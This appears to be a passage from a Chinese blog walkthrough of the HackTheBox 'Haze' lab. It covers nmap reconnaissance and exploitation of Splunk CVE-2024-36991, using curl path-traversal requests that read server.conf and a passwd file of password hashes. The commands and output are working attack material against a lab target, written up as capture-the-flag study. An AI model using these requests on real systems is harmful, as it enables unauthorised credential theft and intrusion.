<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">HackTheBox - Season7-Haze</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c16f7e2b105eef61.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c16f7e2b105eef61.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-87d35e113019ad3d.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_buildManifest.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3xl px-3 mt-5 md:mt-15"><h1 class="text-xl md:text-2xl font-bold text-red-700">HackTheBox - Season7-Haze</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">SUNSET</p><p class="font-thin text-gray-600 ml-2 md:text-base">2025-04-04</p><p class="font-thin text-gray-600 ml-2 md:text-base">(Updated:<!-- -->2025-04-04<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">域渗透</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">Windows靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700">encrypt</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Haze","contentHtml":"\u003ch1\u003eSeason7-Haze\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/competitive/7/overview\"\u003ehttps://app.hackthebox.com/competitive/7/overview\u003c/a\u003e | \u003ccode\u003eHard\u003c/code\u003e | \u003ccode\u003eWindows\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003enmap\u003c/code\u003e 进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -min-rate 10000 -p- 10.10.11.61\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:04 EDT\nWarning: 10.10.11.61 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.61\nHost is up (0.33s latency).\nNot shown: 59223 closed tcp ports (conn-refused), 6285 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8000/tcp  open  http-alt\n8088/tcp  open  radan-http\n8089/tcp  open  unknown\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n56730/tcp open  unknown\n56739/tcp open  unknown\n56740/tcp open  unknown\n56742/tcp open  unknown\n56779/tcp open  unknown\n56941/tcp open  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e添加域名\u003ccode\u003ehaze.htb\u003c/code\u003e 和 \u003ccode\u003edc01.haze.htb\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  nmap -sT -A -T4 -O -p 53,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49668,56730,56739,56740,56742,56779,56941 10.10.11.61\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 01:10 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.61\nHost is up (0.41s latency).                                                                              \n                                                                                                         \nPORT      STATE SERVICE       VERSION \n53/tcp    open  domain        Simple DNS Plus                                                            \n135/tcp   open  msrpc         Microsoft Windows RPC \n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                              \n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e  \n| ssl-cert: Subject: commonName=dc01.haze.htb       \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:dc01.haze.htb             \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20             \n445/tcp   open  microsoft-ds?                       \n464/tcp   open  kpasswd5?                           \n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        \n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e  \n| ssl-cert: Subject: commonName=dc01.haze.htb       \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:dc01.haze.htb             \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20             \n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          \n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e                                                                                                                                                                 \n| ssl-cert: Subject: commonName=dc01.haze.htb      \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:dc01.haze.htb         \n| Not valid before: 2025-03-05T07:12:20                                                                  \n|_Not valid after:  2026-03-05T07:12:20                                                                  \n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)                                                                                          | ssl-cert: Subject: commonName=dc01.haze.htb                                                            \n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:dc01.haze.htb                                                                                                                       | Not valid before: 2025-03-05T07:12:20                                                                                                                                                                            \n|_Not valid after:  2026-03-05T07:12:20                                                                  \n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: TLS randomness does not represent \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e                                                                                                                                                                 \n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              \n|_http-title: Not Found                                                                                  \n|_http-server-header: Microsoft-HTTPAPI/2.0                                                              \n8000/tcp  open  http          Splunkd httpd                                                                                                                                                                        \n|_http-server-header: Splunkd                                                                            \n| http-robots.txt: 1 disallowed entry \n|_/                                       \n| http-title: Site doesn\u003cspan class=\"hljs-string\"\u003e't have a title (text/html; charset=UTF-8).                  \n|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F               \n8088/tcp  open  ssl/http      Splunkd httpd\n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser  \n| Not valid before: 2025-03-05T07:29:08                                                                  \n|_Not valid after:  2028-03-04T07:29:08                                                                                                                                                                            \n| http-robots.txt: 1 disallowed entry                                                                                                                                                                              \n|_/                                                                                                      \n|_http-title: 404 Not Found     \n|_http-server-header: Splunkd                                                                            \n8089/tcp  open  ssl/http      Splunkd httpd                                                              \n|_http-server-header: Splunkd         \n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser                      \n| Not valid before: 2025-03-05T07:29:08             \n|_Not valid after:  2028-03-04T07:29:08                                                                  \n|_http-title: splunkd                                                                                                                                                                                              \n| http-robots.txt: 1 disallowed entry               \n|_/                                                 \n9389/tcp  open  mc-nmf        .NET Message Framing                                                       \n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                    \n|_http-server-header: Microsoft-HTTPAPI/2.0         \n|_http-title: Not Found                             \n49664/tcp open  msrpc         Microsoft Windows RPC \n49665/tcp open  msrpc         Microsoft Windows RPC                                                      \n49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n49667/tcp open  msrpc         Microsoft Windows RPC \n49668/tcp open  msrpc         Microsoft Windows RPC \n56730/tcp open  msrpc         Microsoft Windows RPC                                                      \n56739/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                        \n56740/tcp open  msrpc         Microsoft Windows RPC \n56742/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n56779/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                \n56941/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose                                                                             \nRunning (JUST GUESSING): Microsoft Windows 10|2022|2016|2012|2019|Vista|11|7|8.1|2008 (93%)              \nOS CPE: cpe:/o:microsoft:windows_10:1703 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2008::sp2                    \nAggressive OS guesses: Microsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2019 (93%), Microsoft Windows Server 2016 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2022 (91%), Microsoft Windows 11 21H2 (91%)                                   \nNo exact OS matches for host (test conditions non-ideal).                                                \nNetwork Distance: 2 hops                                                                                                                                                                                           \nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                               \n                                                                                                         \nHost script results:                                                                                     \n|_clock-skew: 7h41m12s                                                                                                                                                                                             \n| smb2-security-mode:                                                                                    \n|   3:1:1:                            \n|_    Message signing enabled and required\n| smb2-time:                                                                                             \n|   date: 2025-03-31T12:53:32                                                                            \n|_  start_date: N/A                        \n                                                                                                         \nTRACEROUTE (using proto 1/icmp)                                                                          \nHOP RTT       ADDRESS                                                                                                                                                                                              \n1   461.62 ms xxxxxxx                                                                                                                                                                                           \n2   286.29 ms 10.10.11.61                                                                                \n                                                    \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .    \nNmap done: 1 IP address (1 host up) scanned in 116.57 seconds                 \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试枚举 SMB 和 LDAP 匿名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze  smbclient -L dc01.haze.htb                                                \nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\root]:   \n\n⚡ root@kali  ~/Desktop/test/Haze  ldapsearch -x -H ldap://dc01.haze.htb                                                                                                  \n\u003cspan class=\"hljs-comment\"\u003e# extended LDIF\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# LDAPv3\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# base \u0026#x3C;\u003e (default) with scope subtree\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# filter: (objectclass=*)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# requesting: ALL\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# search result\u003c/span\u003e\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090CAF, comment: In order to perform this opera\n tion a successful \u003cspan class=\"hljs-built_in\"\u003ebind\u003c/span\u003e must be completed on the connection., data 0, v4f7c\n\n\u003cspan class=\"hljs-comment\"\u003e# numResponses: 1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003e8000\u003c/code\u003e 端口，运行的是\u003ccode\u003eSplunk-Enterprise\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Haze/image64.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSplunk\u003c/h2\u003e\n\u003cp\u003e通过搜索引擎对其进行公开漏洞搜索，存在任意文件读取漏洞\u003c/p\u003e\n\u003cp\u003e我们通过工具来扫描：\u003ca href=\"https://github.com/bigb0x/CVE-2024-36991\"\u003ehttps://github.com/bigb0x/CVE-2024-36991\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e得到几个域内用户名\u003ccode\u003eMark\u003c/code\u003e，\u003ccode\u003epaul\u003c/code\u003e，\u003ccode\u003eEdward\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  python3 CVE-2024-36991.py -u http://dc01.haze.htb:8000                                  \n/root/Desktop/test/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence \u003cspan class=\"hljs-string\"\u003e'\\ '\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\")\n\n                                                                        \n  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ \n / ___\\ \\   / | ____|   |___ \\ / _ |___ \\| || |      |___ / / /_ / _ \\ / _ \\/ |\n| |    \\ \\ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \\| '_ | (_) | (_) | |\n| |___  \\ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \\__, |\\__, | |\n \\____|  \\_/  |_____|   |_____|\\___|_____|  |_|      |____/ \\___/  /_/   /_/|_|\n                                                                           \n-\u003e POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. \n-\u003e By x.com/MohamedNab1l\n-\u003e Use Wisely.\n\n[INFO] Testing single target: http://dc01.haze.htb:8000\n[VLUN] Vulnerable: http://dc01.haze.htb:8000\n:admin:$6\u003cspan class=\"hljs-variable\"\u003e$Ak3m7\u003c/span\u003e.aHgb/NOQez\u003cspan class=\"hljs-variable\"\u003e$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1\u003c/span\u003e::Administrator:admin:changeme@example.com:::20152\n:edward:$6$3LQHFzfmlpMgxY57\u003cspan class=\"hljs-variable\"\u003e$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22\u003c/span\u003e/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\n:mark:$6\u003cspan class=\"hljs-variable\"\u003e$j4QsAJiV8mLg\u003c/span\u003e/bhA\u003cspan class=\"hljs-variable\"\u003e$Oa\u003c/span\u003e/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\n:paul:$6$Y5ds8NjDLd7SzOTW\u003cspan class=\"hljs-variable\"\u003e$Zg\u003c/span\u003e/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是靶机是\u003ccode\u003eWindows\u003c/code\u003e的，不会存在\u003ccode\u003e/etc/passwd\u003c/code\u003e文件，所以应该是容器\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Splunk%20Enterprise/Splunk-Enterprise%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md\"\u003ehttps://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Splunk%20Enterprise/Splunk-Enterprise%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eGET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1\nHost: x.x.x.x\nUser-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nConnection: close\nAccept-Encoding: gzip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们通过\u003ccode\u003ecurl\u003c/code\u003e 来尝试，成功读取\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl 10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini \n; \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\n[MAPI=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eSplunk LFI 利用\u003c/h2\u003e\n\u003cp\u003e根据目录结构来构造\u003ccode\u003eLFI\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e目录结构（官方）：\u003ca href=\"https://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles\"\u003ehttps://docs.splunk.com/Documentation/Splunk/9.4.1/Admin/Listofconfigurationfiles\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esplunk/etc/system/local/inputs.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl \u003cspan class=\"hljs-string\"\u003e\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../program%20files/splunk/etc/system/local/server.conf\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl \u003cspan class=\"hljs-string\"\u003e\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/system/local/server.conf\"\u003c/span\u003e\n[general]\nserverName = dc01\npass4SymmKey = $7\u003cspan class=\"hljs-variable\"\u003e$lPCemQk01ejJvI8nwCjXjx7PJclrQJ\u003c/span\u003e+SfC3/ST+K0s+1LsdlNuXwlA==\n\n[sslConfig]\nsslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==\n\n[lmpool:auto_generated_pool_download-trial]\ndescription = auto_generated_pool_download-trial\npeers = *\nquota = MAX\nstack_id = download-trial\n\n[lmpool:auto_generated_pool_forwarder]\ndescription = auto_generated_pool_forwarder\npeers = *\nquota = MAX\nstack_id = forwarder\n\n[lmpool:auto_generated_pool_free]\ndescription = auto_generated_pool_free\npeers = *\nquota = MAX\nstack_id = free\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esplunk/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e不是容器，而是\u003ccode\u003eSplunk\u003c/code\u003e的配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Haze/CVE-2024-36991  curl \u003cspan class=\"hljs-string\"\u003e\"http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/splunk/etc/passwd\"\u003c/span\u003e\n:admin:$6\u003cspan class=\"hljs-variable\"\u003e$Ak3m7\u003c/span\u003e.aHgb/NOQez\u003cspan class=\"hljs-variable\"\u003e$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1\u003c/span\u003e::Administrator:admin:changeme@example.com:::20152\n:edward:$6$3LQHFzfmlpMgxY57\u003cspan class=\"hljs-variable\"\u003e$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22\u003c/span\u003e/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\n:mark:$6\u003cspan class=\"hljs-variable\"\u003e$j4QsAJiV8mLg\u003c/span\u003e/bhA\u003cspan 